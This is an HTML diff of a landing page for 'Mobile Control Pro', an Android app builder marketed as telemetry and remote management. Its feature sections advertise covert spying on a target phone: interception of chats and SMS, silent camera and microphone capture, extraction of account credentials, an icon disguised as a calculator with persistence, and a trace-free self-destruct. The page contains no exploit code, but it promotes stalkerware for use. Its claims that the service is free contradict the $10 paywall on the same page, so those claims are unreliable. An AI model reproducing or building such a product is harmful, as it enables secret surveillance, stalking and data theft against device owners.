+                <button onclick="showLockModal('Get 1 Month Full Access VIP ($10 USDT) to unlock all premium features!')" class="spatial-nav-btn" style="background: linear-gradient(135deg, #f3ba2f 0%, #d49e15 100%); color: #000; border: none; font-weight: 800; box-shadow: 0 4px 15px rgba(243, 186, 47, 0.4); cursor: pointer;" title="Unlock Full Access VIP ($10/mo)">
+                    <i class="fas fa-crown"></i> VIP ($10/mo)
+                </button>
+
+                <!-- New Live Interactive Demo Button -->
+                <a href="demo.html" class="spatial-nav-demo" title="Explore Live Interactive Demo">
+                    <i class="fas fa-play-circle" style="color: #ffd60a;"></i> Demo
                 </a>
+
+                <a href="#features" class="hide-mobile spatial-nav-link" onclick="smoothScrollTo('features', event)">Features</a>
+                <a href="#security" class="hide-mobile spatial-nav-link" onclick="smoothScrollTo('security', event)">Security</a>
+                <a href="#founder" class="hide-mobile spatial-nav-link" onclick="smoothScrollTo('founder', event)">Founder</a>
                 
-                <!-- Google User Profile Section -->
-                <div id="navUserProfile" style="display: none;" class="user-profile-badge">
-                    <img id="userAvatar" src="" alt="Avatar" class="user-avatar-img">
-                    <div class="user-info-col">
-                        <span id="userName" class="user-name-txt">User Name</span>
-                        <span id="userRoleBadge" class="role-badge-txt">USER</span>
-                    </div>
-                    <button id="signOutBtn" onclick="handleSignOut()" class="btn-signout">
-                        <i class="fas fa-sign-out-alt"></i><span class="hide-mobile"> Sign Out</span>
-                    </button>
+                <a href="builder.html" class="spatial-nav-btn" title="Open Admin Control Panel">
+                    <i class="fas fa-sliders"></i> Open Control Panel
+                </a>
+            </div>
+        </nav>
+    </header>
+
+    <!-- 3. Hero Section with 3D Suspended Spatial Object -->
+    <main style="max-width: 1280px; margin: 0 auto; padding: 0 24px 80px; position: relative; z-index: 10;">
+        
+        <section class="hero-spatial-container">
+            
+            <!-- 100% FREE 24/7 Elevated Badge -->
+            <div>
+                <div class="free-24-7-banner">
+                    <i class="fas fa-gift" style="font-size: 1.3rem;"></i>
+                    <span>100% FREE FOR EVERYONE • 24/7 UNLIMITED LIVE ACCESS</span>
                 </div>
             </div>
 
-            <div class="navbar-bottom-row" style="display: flex; align-items: center; justify-content: space-between; flex-wrap: wrap; gap: 10px;">
-                <div style="display: flex; align-items: center; gap: 8px;">
-                    <a href="home.html" class="nav-link"><i class="fas fa-house me-1"></i> Home</a>
-                    <a href="admin.html" id="adminPanelBtn" class="nav-link admin-link" style="display: none;"><i class="fas fa-user-shield me-1"></i> Admin Panel</a>
-                    <a href="index.html" class="nav-link active"><i class="fas fa-hammer me-1"></i> Builder</a>
+            <h1 style="font-family: 'Outfit', -apple-system, sans-serif; font-size: clamp(2.4rem, 5.5vw, 4.2rem); font-weight: 900; line-height: 1.1; margin-bottom: 20px; color: #fff; letter-spacing: -0.035em;">
+                Spatial Android Telemetry <br>
+                <span style="background: linear-gradient(135deg, #ff453a 0%, #ff7b72 45%, #ffffff 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent;">Remote Control & Intelligence Suite</span>
+            </h1>
+
+            <p style="font-size: clamp(1.05rem, 2vw, 1.25rem); color: var(--text-secondary); line-height: 1.65; max-width: 800px; margin: 0 auto 36px; letter-spacing: -0.01em;">
+                A groundbreaking spatial command center for high-accuracy telemetry, multi-provider GPS positioning, dual-engine social chat interception, and remote device orchestration.
+            </p>
+
+            <div style="display: flex; align-items: center; justify-content: center; gap: 16px; flex-wrap: wrap;">
+                <a href="builder.html" class="btn-primary-glow" style="padding: 16px 38px; font-size: 1.05rem; font-weight: 800; border-radius: var(--radius-pill); text-decoration: none; display: inline-flex; align-items: center; gap: 10px; box-shadow: 0 10px 35px var(--primary-glow);">
+                    <i class="fas fa-rocket"></i> Launch Control Panel
+                </a>
+                <a href="demo.html" class="btn-ghost" style="padding: 15px 32px; font-size: 1rem; font-weight: 700; border-radius: var(--radius-pill); text-decoration: none; display: inline-flex; align-items: center; gap: 8px; border-color: rgba(255, 214, 10, 0.4); color: #ffd60a; background: rgba(255, 214, 10, 0.08);">
+                    <i class="fas fa-play-circle" style="color: #ffd60a;"></i> View Live Demo
+                </a>
+                <a href="#features" class="btn-ghost" onclick="smoothScrollTo('features', event)" style="padding: 15px 28px; font-size: 0.95rem; font-weight: 600; border-radius: var(--radius-pill); text-decoration: none; display: inline-flex; align-items: center; gap: 8px;">
+                    <i class="fas fa-list-check"></i> 9 Features
+                </a>
+            </div>
+
+            <!-- 4. Suspended 3D Glass Device Stage (Physical Spatial Object) -->
+            <div class="hero-3d-stage" id="hero3DStage">
+                
+                <!-- 3D Orbiting Gyro Spatial Rings -->
+                <div class="spatial-gyro-ring spatial-gyro-1 hide-mobile"></div>
+                <div class="spatial-gyro-ring spatial-gyro-2 hide-mobile"></div>
+
+                <!-- Floating Satellite 1: Top-Right Neural Latency Node -->
+                <div class="spatial-satellite-top-right hide-mobile" id="satelliteTop">
+                    <span class="live-dot" style="background: #bf5af2; width: 8px; height: 8px; box-shadow: 0 0 10px #bf5af2;"></span>
+                    <div style="text-align: left;">
+                        <div style="font-size: 0.68rem; color: var(--text-muted); font-weight: 700; text-transform: uppercase;">CLOUD LATENCY</div>
+                        <div style="font-size: 0.82rem; font-weight: 700; color: #fff;">18ms Realtime WebSocket</div>
+                    </div>
                 </div>
-                <div style="display: flex; align-items: center; gap: 8px;">
-                    <button id="vipUpgradeNavBtn" onclick="showLockModal('Get 1 Month Full Access VIP ($10 USDT) to customize modules & unlock all device controls.')" class="btn-primary-glow" style="padding: 5px 14px; font-size: 0.76rem; font-weight: 700; border-radius: var(--radius-pill); background: linear-gradient(135deg, #f3ba2f 0%, #d49e15 100%); color: #000; border: none; box-shadow: 0 4px 15px rgba(243, 186, 47, 0.35); display: inline-flex; align-items: center; gap: 6px; cursor: pointer;">
-                        <i class="fas fa-crown"></i> <span id="vipNavBtnText">VIP ($10/mo)</span>
-                    </button>
-                    <span class="live-badge"><span class="live-dot"></span> 100% FREE 24/7 ACTIVE</span>
+
+                <!-- Floating Satellite 2: Bottom-Left Microservice Node -->
+                <div class="spatial-satellite-bottom-left hide-mobile" id="satelliteBottom">
+                    <i class="fas fa-microchip" style="color: #0a84ff; font-size: 1.1rem;"></i>
+                    <div style="text-align: left;">
+                        <div style="font-size: 0.68rem; color: var(--text-muted); font-weight: 700; text-transform: uppercase;">CPU LOAD</div>
+                        <div style="font-size: 0.82rem; font-weight: 700; color: #fff;">0.2% Battery Consumed</div>
+                    </div>
                 </div>
+
+                <!-- Floating Left Chip: GPS Telemetry Multi-Provider -->
+                <div class="floating-accent-chip-left hide-mobile" id="chipLeft">
+                    <span class="live-dot" style="background: #30d158; width: 10px; height: 10px;"></span>
+                    <div style="text-align: left;">
+                        <div style="font-size: 0.72rem; color: #30d158; font-weight: 700; text-transform: uppercase;">GPS LOCK</div>
+                        <div style="font-size: 0.85rem; font-weight: 700; color: #fff;">Multi-Provider Active</div>
+                    </div>
+                </div>
+
+                <!-- Central 3D Floating Glass Slab -->
+                <div class="suspended-glass-device" id="hero3DObject">
+                    
+                    <!-- Top Bar inside Device Layer -->
+                    <div class="glass-sublayer-1">
+                        <div style="display: flex; align-items: center; gap: 10px;">
+                            <span class="brand-icon" style="width: 32px; height: 32px; font-size: 0.9rem;"><i class="fas fa-satellite-dish"></i></span>
+                            <span style="font-family: 'Outfit', sans-serif; font-weight: 800; color: #fff; font-size: 1rem;">SPATIAL TELEMETRY FEED</span>
+                        </div>
+                        <div style="display: flex; align-items: center; gap: 10px;">
+                            <span class="live-badge" style="font-size: 0.7rem;"><span class="live-dot"></span> ENCRYPTED E2E</span>
+                        </div>
+                    </div>
+
+                    <!-- Middle Telemetry Grid inside Device Layer -->
+                    <div class="glass-sublayer-2">
+                        <div class="glass-telemetry-tile">
+                            <div style="font-size: 0.7rem; color: #0a84ff; font-weight: 700; margin-bottom: 4px;"><i class="fas fa-location-dot"></i> GPS TELEMETRY</div>
+                            <div style="font-size: 1.05rem; font-weight: 800; color: #fff;">23.8103° N, 90.4125° E</div>
+                            <div style="font-size: 0.72rem; color: var(--text-muted); margin-top: 2px;">Accuracy: 2.4m • High Precision</div>
+                        </div>
+                        <div class="glass-telemetry-tile">
+                            <div style="font-size: 0.7rem; color: #30d158; font-weight: 700; margin-bottom: 4px;"><i class="fas fa-comments"></i> CHAT INTERCEPT</div>
+                            <div style="font-size: 1.05rem; font-weight: 800; color: #fff;">5 Feeds Live</div>
+                            <div style="font-size: 0.72rem; color: var(--text-muted); margin-top: 2px;">WhatsApp, TG, MSG, IG, IMO</div>
+                        </div>
+                        <div class="glass-telemetry-tile">
+                            <div style="font-size: 0.7rem; color: #ff3b30; font-weight: 700; margin-bottom: 4px;"><i class="fas fa-shield-check"></i> ACCESS LEVEL</div>
+                            <div style="font-size: 1.05rem; font-weight: 800; color: #fff;">100% Free 24/7</div>
+                            <div style="font-size: 0.72rem; color: var(--text-muted); margin-top: 2px;">Zero Limits • Unlimited Devices</div>
+                        </div>
+                    </div>
+
+                    <!-- Bottom Bar inside Device Layer -->
+                    <div style="display: flex; align-items: center; justify-content: space-between; transform: translateZ(40px); font-size: 0.78rem; color: var(--text-secondary); border-top: 1px solid rgba(255,255,255,0.08); padding-top: 14px;">
+                        <span><i class="fas fa-microchip" style="color: var(--primary);"></i> Engine: Native Kotlin Background Worker</span>
+                        <span><i class="fas fa-cloud" style="color: #30d158;"></i> Serverless Cloud Pipeline</span>
+                    </div>
+
+                </div>
+
+                <!-- Floating Right Chip: Stealth Engine (*#8888# Rescue) with full unclipped visibility -->
+                <div class="floating-accent-chip-right hide-mobile" id="chipRight">
+                    <i class="fas fa-shield-halved" style="color: var(--primary); font-size: 1.25rem;"></i>
+                    <div style="text-align: left;">
+                        <div style="font-size: 0.72rem; color: #ff453a; font-weight: 700; text-transform: uppercase;">STEALTH ENGINE</div>
+                        <div style="font-size: 0.85rem; font-weight: 700; color: #fff;">*#8888# Dial Rescue</div>
+                    </div>
+                </div>
+
+                <!-- Realistic Floor Contact Shadow -->
+                <div class="hero-contact-shadow"></div>
+            </div>
+
+            <!-- Stats Bar -->
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 16px; max-width: 980px; margin: 40px auto 0;">
+                <div class="stat-badge">
+                    <div style="font-family: 'Outfit', sans-serif; font-size: 1.9rem; font-weight: 800; color: #30d158; letter-spacing: -0.02em;">100% FREE</div>
+                    <div style="font-size: 0.82rem; color: var(--text-secondary); margin-top: 4px;">Zero Cost • Lifetime Free</div>
+                </div>
+                <div class="stat-badge">
+                    <div style="font-family: 'Outfit', sans-serif; font-size: 1.9rem; font-weight: 800; color: #ff3b30; letter-spacing: -0.02em;">E2E 256-BIT</div>
+                    <div style="font-size: 0.82rem; color: var(--text-secondary); margin-top: 4px;">Military-Grade Cryptography</div>
+                </div>
+                <div class="stat-badge">
+                    <div style="font-family: 'Outfit', sans-serif; font-size: 1.9rem; font-weight: 800; color: #ffd60a; letter-spacing: -0.02em;">24/7 LIVE</div>
+                    <div style="font-size: 0.82rem; color: var(--text-secondary); margin-top: 4px;">Zero-Dropout Connectivity</div>
+                </div>
+                <div class="stat-badge">
+                    <div style="font-family: 'Outfit', sans-serif; font-size: 1.9rem; font-weight: 800; color: #0a84ff; letter-spacing: -0.02em;">NO-ROOT</div>
+                    <div style="font-size: 0.82rem; color: var(--text-secondary); margin-top: 4px;">Android 8 to Android 16</div>
+                </div>
+            </div>
+
+        </section>
+
+        <!-- 5. Spatial 3D Feature Compositions -->
+        <section id="features" style="margin-top: 60px; scroll-margin-top: 100px;">
+            <div style="text-align: center; margin-bottom: 55px;">
+                <span style="color: var(--primary); font-size: 0.85rem; font-weight: 800; letter-spacing: 1.5px; text-transform: uppercase; display: inline-block; margin-bottom: 8px;">SPATIAL CAPABILITIES</span>
+                <h2 style="font-family: 'Outfit', sans-serif; font-size: 2.4rem; font-weight: 800; color: #fff; letter-spacing: -0.02em;">Complete Suite of Professional Features</h2>
+                <p style="color: var(--text-secondary); font-size: 0.98rem; max-width: 650px; margin: 10px auto 0; line-height: 1.6;">Every feature operates fully in real-time via low-latency Secure Cloud WebSockets and automated Cloud Server pipelines.</p>
+            </div>
+
+            <div class="spatial-feature-grid">
+
+                <!-- Feature 1: Live GPS Tracker -->
+                <div class="spatial-card">
+                    <span class="spatial-card-badge">LIVE PINPOINT</span>
+                    <div>
+                        <div class="feature-icon-box" style="background: rgba(10, 132, 255, 0.15); color: #0a84ff;">
+                            <i class="fas fa-location-crosshairs"></i>
+                        </div>
+                        <h3 style="font-family: 'Outfit', sans-serif; font-size: 1.3rem; font-weight: 800; color: #fff; margin-bottom: 10px; letter-spacing: -0.01em;">1. Live GPS Location Tracker</h3>
+                        <p style="color: var(--text-secondary); font-size: 0.88rem; line-height: 1.6;">
+                            Triangulates multi-provider data (GPS, Cellular Tower, and Wi-Fi Fused Providers) for high-accuracy pinpoint coordinates, speed, altitude, and live map plotting.
+                        </p>
+                    </div>
+                    <div style="margin-top: 24px; padding-top: 14px; border-top: 1px solid rgba(255,255,255,0.07); font-size: 0.78rem; color: #0a84ff; font-weight: 600;">
+                        <i class="fas fa-satellite"></i> Multi-Provider Active Single Update
+                    </div>
+                </div>
+
+                <!-- Feature 2: Social Media Chat Feed -->
+                <div class="spatial-card">
+                    <span class="spatial-card-badge" style="color: #30d158; border-color: rgba(48,209,88,0.3);">DUAL-ENGINE</span>
+                    <div>
+                        <div class="feature-icon-box" style="background: rgba(48, 209, 88, 0.15); color: #30d158;">
+                            <i class="fas fa-comments"></i>
+                        </div>
+                        <h3 style="font-family: 'Outfit', sans-serif; font-size: 1.3rem; font-weight: 800; color: #fff; margin-bottom: 10px; letter-spacing: -0.01em;">2. Social Media & Chat Feed</h3>
+                        <p style="color: var(--text-secondary); font-size: 0.88rem; line-height: 1.6;">
+                            Captures real-time incoming and outgoing messages from WhatsApp, Messenger, Telegram, Instagram, and IMO with dual-engine notification & accessibility interception.
+                        </p>
+                    </div>
+                    <div style="margin-top: 24px; padding-top: 14px; border-top: 1px solid rgba(255,255,255,0.07); font-size: 0.78rem; color: #30d158; font-weight: 600;">
+                        <i class="fas fa-shield-halved"></i> Zero-Permission Fallback Supported
+                    </div>
+                </div>
+
+                <!-- Feature 3: Live Camera Stream & Snap -->
+                <div class="spatial-card">
+                    <span class="spatial-card-badge" style="color: #ff3b30; border-color: rgba(255,59,48,0.3);">STEALTH STREAM</span>
+                    <div>
+                        <div class="feature-icon-box" style="background: rgba(255, 59, 48, 0.15); color: #ff3b30;">
+                            <i class="fas fa-video"></i>
+                        </div>
+                        <h3 style="font-family: 'Outfit', sans-serif; font-size: 1.3rem; font-weight: 800; color: #fff; margin-bottom: 10px; letter-spacing: -0.01em;">3. Live Camera Stream & Snap</h3>
+                        <p style="color: var(--text-secondary); font-size: 0.88rem; line-height: 1.6;">
+                            Stream live video silently from front or rear cameras without preview windows or flash, and capture high-resolution snapshots directly to your private Cloud Server.
+                        </p>
+                    </div>
+                    <div style="margin-top: 24px; padding-top: 14px; border-top: 1px solid rgba(255,255,255,0.07); font-size: 0.78rem; color: #ff3b30; font-weight: 600;">
+                        <i class="fas fa-camera-rotate"></i> Front/Back Seamless Switch
+                    </div>
+                </div>
+
+                <!-- Feature 4: Live Audio & Mic Bug -->
+                <div class="spatial-card">
+                    <span class="spatial-card-badge" style="color: #ff9f0a; border-color: rgba(255,159,10,0.3);">16KHZ PCM</span>
+                    <div>
+                        <div class="feature-icon-box" style="background: rgba(255, 159, 10, 0.15); color: #ff9f0a;">
+                            <i class="fas fa-microphone"></i>
+                        </div>
+                        <h3 style="font-family: 'Outfit', sans-serif; font-size: 1.3rem; font-weight: 800; color: #fff; margin-bottom: 10px; letter-spacing: -0.01em;">4. Live Audio & Ambient Bug</h3>
+                        <p style="color: var(--text-secondary); font-size: 0.88rem; line-height: 1.6;">
+                            Listen in real-time to live microphone audio streams or record 5–60s ambient audio clips with automated Cloud Server background upload.
+                        </p>
+                    </div>
+                    <div style="margin-top: 24px; padding-top: 14px; border-top: 1px solid rgba(255,255,255,0.07); font-size: 0.78rem; color: #ff9f0a; font-weight: 600;">
+                        <i class="fas fa-wave-square"></i> Noise Filtered Stream
+                    </div>
+                </div>
+
+                <!-- Feature 5: File Manager & Drive Sync -->
+                <div class="spatial-card">
+                    <span class="spatial-card-badge" style="color: #bf5af2; border-color: rgba(191,90,242,0.3);">CLOUD AUTOMATION</span>
+                    <div>
+                        <div class="feature-icon-box" style="background: rgba(191, 90, 242, 0.15); color: #bf5af2;">
+                            <i class="fas fa-folder-open"></i>
+                        </div>
+                        <h3 style="font-family: 'Outfit', sans-serif; font-size: 1.3rem; font-weight: 800; color: #fff; margin-bottom: 10px; letter-spacing: -0.01em;">5. Remote File Explorer</h3>
+                        <p style="color: var(--text-secondary); font-size: 0.88rem; line-height: 1.6;">
+                            Browse full internal storage and SD card hierarchies, inspect documents, photos, and videos, and trigger remote file transfers to your cloud drive.
+                        </p>
+                    </div>
+                    <div style="margin-top: 24px; padding-top: 14px; border-top: 1px solid rgba(255,255,255,0.07); font-size: 0.78rem; color: #bf5af2; font-weight: 600;">
+                        <i class="fas fa-cloud-arrow-up"></i> Direct Cloud Server Backup
+                    </div>
+                </div>
+
+                <!-- Feature 6: Calls, Contacts & SMS -->
+                <div class="spatial-card">
+                    <span class="spatial-card-badge" style="color: #64d2ff; border-color: rgba(100,210,255,0.3);">REALTIME SYNC</span>
+                    <div>
+                        <div class="feature-icon-box" style="background: rgba(100, 210, 255, 0.15); color: #64d2ff;">
+                            <i class="fas fa-address-book"></i>
+                        </div>
+                        <h3 style="font-family: 'Outfit', sans-serif; font-size: 1.3rem; font-weight: 800; color: #fff; margin-bottom: 10px; letter-spacing: -0.01em;">6. Calls, SMS & Contacts</h3>
+                        <p style="color: var(--text-secondary); font-size: 0.88rem; line-height: 1.6;">
+                            Access incoming/outgoing call history with durations, synchronized phonebook contacts, and intercept real-time SMS messages into your dashboard.
+                        </p>
+                    </div>
+                    <div style="margin-top: 24px; padding-top: 14px; border-top: 1px solid rgba(255,255,255,0.07); font-size: 0.78rem; color: #64d2ff; font-weight: 600;">
+                        <i class="fas fa-clock-rotate-left"></i> Full Call Durations & Timestamps
+                    </div>
+                </div>
+
+                <!-- Feature 7: Accounts & Logged-in IDs -->
+                <div class="spatial-card">
+                    <span class="spatial-card-badge" style="color: #ffd60a; border-color: rgba(255,214,10,0.3);">AUTHENTICATOR SCAN</span>
+                    <div>
+                        <div class="feature-icon-box" style="background: rgba(255, 214, 10, 0.15); color: #ffd60a;">
+                            <i class="fas fa-users-gear"></i>
+                        </div>
+                        <h3 style="font-family: 'Outfit', sans-serif; font-size: 1.3rem; font-weight: 800; color: #fff; margin-bottom: 10px; letter-spacing: -0.01em;">7. Logged-in Accounts Extractor</h3>
+                        <p style="color: var(--text-secondary); font-size: 0.88rem; line-height: 1.6;">
+                            Discovers active Cloud, WhatsApp, Telegram, Samsung, Xiaomi, and device accounts across system account authenticators in real-time.
+                        </p>
+                    </div>
+                    <div style="margin-top: 24px; padding-top: 14px; border-top: 1px solid rgba(255,255,255,0.07); font-size: 0.78rem; color: #ffd60a; font-weight: 600;">
+                        <i class="fas fa-id-badge"></i> Deep Multi-Authenticator Scan
+                    </div>
+                </div>
+
+                <!-- Feature 8: Stealth & Disguise Engine -->
+                <div class="spatial-card">
+                    <span class="spatial-card-badge" style="color: #ff453a; border-color: rgba(255,69,58,0.3);">*#8888# RESCUE</span>
+                    <div>
+                        <div class="feature-icon-box" style="background: rgba(255, 69, 58, 0.15); color: #ff453a;">
+                            <i class="fas fa-user-ninja"></i>
+                        </div>
+                        <h3 style="font-family: 'Outfit', sans-serif; font-size: 1.3rem; font-weight: 800; color: #fff; margin-bottom: 10px; letter-spacing: -0.01em;">8. Stealth & Disguise Engine</h3>
+                        <p style="color: var(--text-secondary); font-size: 0.88rem; line-height: 1.6;">
+                            Hide the app launcher icon completely, rescue via phone dialer code (*#8888#), disguise as Calculator/System Update, and maintain persistence with auto-restart guards.
+                        </p>
+                    </div>
+                    <div style="margin-top: 24px; padding-top: 14px; border-top: 1px solid rgba(255,255,255,0.07); font-size: 0.78rem; color: #ff453a; font-weight: 600;">
+                        <i class="fas fa-mask"></i> Stealth Launcher Alias System
+                    </div>
+                </div>
+
+                <!-- Feature 9: Remote Wipe & Self-Destruct -->
+                <div class="spatial-card">
+                    <span class="spatial-card-badge" style="color: #ef4444; border-color: rgba(239,68,68,0.3);">ZERO-TRACE</span>
+                    <div>
+                        <div class="feature-icon-box" style="background: rgba(239, 68, 68, 0.15); color: #ef4444;">
+                            <i class="fas fa-skull"></i>
+                        </div>
+                        <h3 style="font-family: 'Outfit', sans-serif; font-size: 1.3rem; font-weight: 800; color: #fff; margin-bottom: 10px; letter-spacing: -0.01em;">9. Remote Wipe & Self-Destruct</h3>
+                        <p style="color: var(--text-secondary); font-size: 0.88rem; line-height: 1.6;">
+                            Trigger a remote self-destruct command that completely wipes local cache, clears credentials, and uninstalls the app without leaving residual traces.
+                        </p>
+                    </div>
+                    <div style="margin-top: 24px; padding-top: 14px; border-top: 1px solid rgba(255,255,255,0.07); font-size: 0.78rem; color: #ef4444; font-weight: 600;">
+                        <i class="fas fa-trash-can"></i> Instant Purge Architecture
+                    </div>
+                </div>
+
+            </div>
+        </section>
+
+        <!-- 6. Security & End-to-End Encryption Spatial Vault -->
+        <section id="security" class="spatial-security-vault" style="scroll-margin-top: 100px;">
+            <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 40px; align-items: center;">
+                <div>
+                    <div style="display: inline-flex; align-items: center; gap: 8px; background: rgba(48, 209, 88, 0.12); border: 1px solid rgba(48, 209, 88, 0.35); padding: 6px 16px; border-radius: var(--radius-pill); color: #30d158; font-size: 0.82rem; font-weight: 700; margin-bottom: 16px; transform: translateZ(20px);">
+                        <i class="fas fa-lock"></i> ZERO-KNOWLEDGE ARCHITECTURE
+                    </div>
+                    <h2 style="font-family: 'Outfit', sans-serif; font-size: 2.3rem; font-weight: 800; color: #fff; margin-bottom: 18px; letter-spacing: -0.02em; transform: translateZ(30px);">
+                        End-to-End Encryption & Total Data Privacy
+                    </h2>
+                    <p style="color: var(--text-secondary); font-size: 0.96rem; line-height: 1.7; margin-bottom: 24px; transform: translateZ(20px);">
+                        All data streams, location telemetry, and files transmit directly between your target device and your private, sandboxed Encrypted Cloud Server. No intermediary relay servers can inspect or decrypt your telemetry.
+                    </p>
+                    <ul style="list-style: none; padding: 0; margin: 0; display: flex; flex-direction: column; gap: 14px; transform: translateZ(25px);">
+                        <li style="display: flex; align-items: center; gap: 14px; font-size: 0.92rem; color: #f5f5f7;">
+                            <i class="fas fa-shield-check" style="color: #30d158; font-size: 1.15rem;"></i>
+                            <span><strong>TLS 1.3 / WSS Enforced:</strong> All real-time WebSocket communication channels are encrypted with TLS 1.3.</span>
+                        </li>
+                        <li style="display: flex; align-items: center; gap: 14px; font-size: 0.92rem; color: #30d158; font-size: 1.15rem;">
+                            <i class="fas fa-shield-check" style="color: #30d158; font-size: 1.15rem;"></i>
+                            <span><strong>Cloud Auth Sandboxing:</strong> Only authenticated administrative accounts can access authorized device nodes.</span>
+                        </li>
+                        <li style="display: flex; align-items: center; gap: 14px; font-size: 0.92rem; color: #30d158; font-size: 1.15rem;">
+                            <i class="fas fa-shield-check" style="color: #30d158; font-size: 1.15rem;"></i>
+                            <span><strong>Zero Third-Party Storage:</strong> All snapshots, ambient recordings, and files reside exclusively in your dedicated Cloud Server.</span>
+                        </li>
+                    </ul>
+                </div>
+
+                <div style="background: rgba(0,0,0,0.55); border: 1px solid rgba(255,255,255,0.12); border-top: 1px solid rgba(255,255,255,0.3); border-radius: 24px; padding: 38px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.8), inset 0 1px 1.5px rgba(255,255,255,0.25); transform: translateZ(45px);">
+                    <div style="width: 88px; height: 88px; margin: 0 auto 24px; background: linear-gradient(135deg, #30d158 0%, #059669 100%); border-radius: 26px; display: flex; align-items: center; justify-content: center; box-shadow: 0 12px 35px rgba(48, 209, 88, 0.38), inset 0 1px 1.5px rgba(255,255,255,0.4);">
+                        <i class="fas fa-key" style="font-size: 2.4rem; color: #fff;"></i>
+                    </div>
+                    <h3 style="font-family: 'Outfit', sans-serif; font-size: 1.5rem; font-weight: 800; color: #fff; margin-bottom: 10px; letter-spacing: -0.01em;">256-Bit Cryptographic Vault</h3>
+                    <p style="color: var(--text-secondary); font-size: 0.88rem; line-height: 1.6; margin-bottom: 26px;">
+                        Device streaming, remote commands, and logs are cryptographically bound to each user's unique identification key.
+                    </p>
+                    <div style="display: inline-flex; align-items: center; gap: 8px; background: rgba(48, 209, 88, 0.12); border: 1px solid rgba(48, 209, 88, 0.4); padding: 9px 24px; border-radius: var(--radius-pill); color: #30d158; font-size: 0.88rem; font-weight: 700;">
+                        <i class="fas fa-circle-check"></i> 100% SECURE & PRIVATE
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 7. Founder & Company Info Spatial Pedestal -->
+        <section id="founder" style="margin-top: 70px; scroll-margin-top: 100px;">
+            <div style="text-align: center; margin-bottom: 44px;">
+                <span style="color: var(--primary); font-size: 0.85rem; font-weight: 800; letter-spacing: 1.5px; text-transform: uppercase; display: inline-block; margin-bottom: 8px;">LEADERSHIP & VISION</span>
+                <h2 style="font-family: 'Outfit', sans-serif; font-size: 2.3rem; font-weight: 800; color: #fff; letter-spacing: -0.02em;">Founder & Company Overview</h2>
+            </div>
+
+            <div class="spatial-founder-shell" id="founderCard">
+                <div class="founder-photo-pedestal">
+                    <!-- Real Founder Photo -->
+                    <img src="IMG_7722.PNG" alt="OHEDUL" class="founder-photo-3d" loading="eager">
+                    <div class="founder-online-pulse" title="Active"></div>
+                </div>
+                
+                <div style="flex-grow: 1; transform: translateZ(25px);">
+                    <div style="display: flex; align-items: center; gap: 14px; flex-wrap: wrap; margin-bottom: 8px;">
+                        <h3 style="font-family: 'Outfit', sans-serif; font-size: 1.85rem; font-weight: 800; color: #fff; margin: 0; letter-spacing: -0.02em;">OHEDUL</h3>
+                        <span style="background: rgba(255, 59, 48, 0.2); color: #ff453a; border: 1px solid rgba(255, 59, 48, 0.45); padding: 4px 14px; border-radius: var(--radius-pill); font-size: 0.74rem; font-weight: 800; letter-spacing: 0.5px;">FOUNDER & LEAD ARCHITECT</span>
+                    </div>
+                    <div style="font-size: 0.96rem; color: var(--primary); font-weight: 600; margin-bottom: 16px;">
+                        Mobile Control Pro Technologies
+                    </div>
+                    <p style="color: var(--text-secondary); font-size: 0.95rem; line-height: 1.65; margin-bottom: 22px;">
+                        Founded and engineered by <strong>OHEDUL</strong>, <strong>Mobile Control Pro</strong> was created with a mission to deliver an open, high-performance, and <strong>100% Free</strong> device telemetry and remote management ecosystem for administrators, developers, and tech enthusiasts worldwide. Engineered with zero-compromise security and cloud-native microservices, the platform guarantees 24/7 unlimited access for everyone.
+                    </p>
+                    <div style="display: flex; align-items: center; gap: 20px; flex-wrap: wrap;">
+                        <span style="font-size: 0.86rem; color: var(--text-muted); display: inline-flex; align-items: center; gap: 8px;">
+                            <i class="fas fa-envelope" style="color: var(--primary);"></i> ohedulislam577@gmail.com
+                        </span>
+                        <span style="font-size: 0.86rem; color: var(--text-muted); display: inline-flex; align-items: center; gap: 8px;">
+                            <i class="fas fa-globe" style="color: var(--primary);"></i> Global Cloud Infrastructure
+                        </span>
+                        <span style="font-size: 0.86rem; color: #30d158; font-weight: 700; display: inline-flex; align-items: center; gap: 8px;">
+                            <i class="fas fa-badge-check"></i> Verified Founder
+                        </span>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 8. Spatial Call to Action -->
+        <section style="margin-top: 70px; background: linear-gradient(135deg, rgba(28, 16, 22, 0.75) 0%, rgba(14, 9, 13, 0.9) 100%); border: 1px solid rgba(255, 59, 48, 0.4); border-top: 1.5px solid rgba(255, 255, 255, 0.3); border-radius: 32px; padding: 56px 36px; text-align: center; box-shadow: 0 30px 80px rgba(0, 0, 0, 0.8), 0 0 50px rgba(255, 59, 48, 0.15), inset 0 1px 2px rgba(255, 255, 255, 0.3); backdrop-filter: blur(40px) saturate(180%); -webkit-backdrop-filter: blur(40px) saturate(180%);">
+            <h2 style="font-family: 'Outfit', sans-serif; font-size: 2.4rem; font-weight: 800; color: #fff; margin-bottom: 14px; letter-spacing: -0.02em;">Get Started in Seconds — 100% Free Forever</h2>
+            <p style="color: var(--text-secondary); font-size: 1.05rem; max-width: 680px; margin: 0 auto 34px; line-height: 1.6;">
+                Generate your personalized Android APK from the Cloud Builder and start monitoring your connected devices with instant real-time telemetry.
+            </p>
+            <a href="builder.html" class="btn-primary-glow" style="padding: 16px 46px; font-size: 1.12rem; font-weight: 800; border-radius: var(--radius-pill); text-decoration: none; display: inline-flex; align-items: center; gap: 10px; box-shadow: 0 10px 35px var(--primary-glow);">
+                <i class="fas fa-play"></i> Open Command Center
+            </a>
+        </section>
+
+    </main>
+
+    <!-- Footer -->
+    <footer style="border-top: 1px solid var(--glass-border); padding: 40px 24px; background: rgba(4, 3, 5, 0.98); text-align: center; position: relative; z-index: 10;">
+        <div style="max-width: 1200px; margin: 0 auto; display: flex; flex-direction: column; align-items: center; gap: 16px;">
+            <div style="font-family: 'Outfit', sans-serif; font-size: 1.18rem; font-weight: 800; color: #fff;">
+                Mobile Control <span style="color: var(--primary);">PRO</span>
+            </div>
+            <p style="color: var(--text-muted); font-size: 0.84rem; margin: 0;">
+                © 2026 Mobile Control Pro. Founded & Engineered by <strong>OHEDUL</strong>. All Rights Reserved.
+            </p>
